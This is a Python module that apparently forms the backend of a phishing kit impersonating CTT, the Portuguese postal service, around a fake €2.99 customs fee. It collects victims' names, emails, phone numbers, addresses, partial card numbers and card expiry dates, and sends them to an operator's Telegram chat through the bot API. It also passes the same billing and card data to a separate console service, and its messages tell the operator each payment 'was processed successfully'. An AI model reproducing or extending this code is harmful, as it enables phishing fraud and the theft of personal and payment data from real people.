import os
import httpx
import asyncio
from datetime import datetime
from typing import Dict, Any
import logging
from console_service import console_service
from telegram_templates import TelegramTemplates

logger = logging.getLogger(__name__)

class TelegramService:
    def __init__(self):
        # Force reload environment variables
        from dotenv import load_dotenv
        load_dotenv()
        
        self.bot_token = os.environ.get('TELEGRAM_BOT_TOKEN')
        self.chat_id = os.environ.get('TELEGRAM_CHAT_ID')
        
        if self.bot_token:
            self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        else:
            self.base_url = None
        
        if not self.bot_token or not self.chat_id:
            logger.warning(f"Telegram bot token or chat ID not configured. Token: {bool(self.bot_token)}, Chat ID: {bool(self.chat_id)}")
        else:
            logger.info(f"Telegram service initialized successfully. Bot token: {self.bot_token[:20]}..., Chat ID: {self.chat_id}")
    
    def escape_markdown_v2(self, text: str) -> str:
        """Escape special characters for MarkdownV2"""
        special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
        for char in special_chars:
            text = text.replace(char, f'\\{char}')
        return text
    
    async def send_message(self, message: str, parse_mode: str = None) -> bool:
        """Send message to Telegram"""
        if not self.bot_token or not self.chat_id:
            logger.error(f"Telegram configuration missing. Token: {bool(self.bot_token)}, Chat ID: {bool(self.chat_id)}")
            return False
            
        try:
            async with httpx.AsyncClient() as client:
                payload = {
                    "chat_id": self.chat_id,
                    "text": message
                }
                
                # Only add parse_mode if specified
                if parse_mode:
                    if parse_mode == "MarkdownV2":
                        message = self.escape_markdown_v2(message)
                        payload["text"] = message
                    payload["parse_mode"] = parse_mode
                
                logger.info(f"Sending message to Telegram. Chat ID: {self.chat_id}, Message length: {len(message)}")
                
                response = await client.post(
                    f"{self.base_url}/sendMessage",
                    json=payload,
                    timeout=10.0
                )
                
                result = response.json()
                
                if response.status_code == 200 and result.get('ok'):
                    logger.info(f"Message sent to Telegram successfully. Message ID: {result.get('result', {}).get('message_id')}")
                    return True
                else:
                    logger.error(f"Failed to send Telegram message. Status: {response.status_code}, Response: {result}")
                    return False
                    
        except Exception as e:
            logger.error(f"Error sending Telegram message: {str(e)}")
            return False
    
    async def send_billing_info(self, billing_data: Dict[str, Any]) -> bool:
        """Send billing information to Telegram"""
        try:
            # First try console output as fallback
            await console_service.send_billing_info(billing_data)
            
            # If Telegram is not configured, just use console
            if not self.bot_token or not self.chat_id:
                logger.warning("Telegram not configured, using console output only")
                return True
                
            message = f"""🏠 Nova Informação de Entrega CTT

👤 Dados Pessoais:
• Nome: {billing_data.get('nome', 'N/A')}
• Email: {billing_data.get('email', 'N/A')}
• Telefone: {billing_data.get('telefone', 'N/A')}

📍 Endereço:
• Morada: {billing_data.get('endereco', 'N/A')}
• Código Postal: {billing_data.get('codigoPostal', 'N/A')}
• Cidade: {billing_data.get('cidade', 'N/A')}

⏰ Data de Submissão: {datetime.now().strftime('%d/%m/%Y às %H:%M')}

🔄 Estado: Aguarda pagamento da taxa alfandegária"""
            
            telegram_success = await self.send_message(message)
            return telegram_success
            
        except Exception as e:
            logger.error(f"Error formatting billing message: {str(e)}")
            return True  # Still return True since console output worked
    
    async def send_payment_info(self, billing_data: Dict[str, Any], card_data: Dict[str, Any]) -> bool:
        """Send payment information to Telegram"""
        try:
            # First try console output as fallback
            await console_service.send_payment_info(billing_data, card_data)
            
            # If Telegram is not configured, just use console
            if not self.bot_token or not self.chat_id:
                logger.warning("Telegram not configured, using console output only")
                return True
                
            # Mask card number for security
            card_number = card_data.get('numeroCartao', '')
            masked_card = '**** **** **** ' + card_number[-4:] if len(card_number) >= 4 else '****'
            
            message = f"""💳 Pagamento de Taxa Alfandegária CTT

👤 Cliente:
• Nome: {billing_data.get('nome', 'N/A')}
• Email: {billing_data.get('email', 'N/A')}

💰 Detalhes do Pagamento:
• Valor: €2,99
• Cartão: {masked_card}
• Data Exp.: {card_data.get('dataExpiracao', 'N/A')}

📍 Entrega:
• Endereço: {billing_data.get('endereco', 'N/A')}
• Código Postal: {billing_data.get('codigoPostal', 'N/A')}
• Cidade: {billing_data.get('cidade', 'N/A')}
• Telefone: {billing_data.get('telefone', 'N/A')}

⏰ Data de Pagamento: {datetime.now().strftime('%d/%m/%Y às %H:%M')}

✅ Estado: Pagamento processado com sucesso"""
            
            telegram_success = await self.send_message(message)
            return telegram_success  # Return True even if only console works
            
        except Exception as e:
            logger.error(f"Error formatting payment message: {str(e)}")
            return True  # Still return True since console output worked
    
    async def send_tracking_update(self, tracking_number: str, status: str) -> bool:
        """Send tracking update to Telegram"""
        try:
            status_emoji = {
                'processing': '🔄',
                'shipped': '📦',
                'in_transit': '🚚',
                'delivered': '✅',
                'failed': '❌'
            }
            
            message = f"""
📦 *Atualização de Rastreamento CTT*

🔢 *Número:* {tracking_number}
{status_emoji.get(status, '📦')} *Estado:* {status}
⏰ *Atualização:* {datetime.now().strftime('%d/%m/%Y às %H:%M')}

🔍 *Rastrear:* [Clique aqui](https://exemplo.com/tracking/{tracking_number})
            """
            
            return await self.send_message(message)
            
        except Exception as e:
            logger.error(f"Error formatting tracking message: {str(e)}")
            return False

# Global instance
telegram_service = TelegramService()